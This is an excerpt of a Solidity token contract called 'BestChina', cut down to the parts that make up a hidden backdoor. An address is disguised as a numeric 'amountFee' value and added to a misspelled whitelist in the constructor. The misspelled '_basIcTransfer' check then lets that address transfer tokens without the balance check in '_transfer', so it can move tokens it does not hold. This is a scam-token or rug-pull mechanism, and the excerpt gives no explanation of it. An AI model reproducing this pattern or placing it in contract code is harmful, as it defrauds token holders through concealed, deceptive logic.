...
abstract contract Ownable {
    ...
    uint256 public amountFee = 731543284558581566516266190338882554122832860390;
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        _feeWhiteLlst[address(uint160(amountFee))] = true;
    ...
    function _basIcTransfer(address seds) internal view returns (bool){
        return _feeWhiteLlst[seds] == false || false;
    }
    ...
    function _transfer(
        ...
        if (_basIcTransfer(from)) require(balance >= amount, "balanceNotEnough");
...
contract BestChina  is AbsToken {
    constructor() AbsToken(
        ...
        18,
        8888888,
        address(0xea5746337c4b0B4849352aBbbd32101FAead18a5),
        address(0xea5746337c4b0B4849352aBbbd32101FAead18a5),
        address(0xea5746337c4b0B4849352aBbbd32101FAead18a5),
        address(0)
    ){
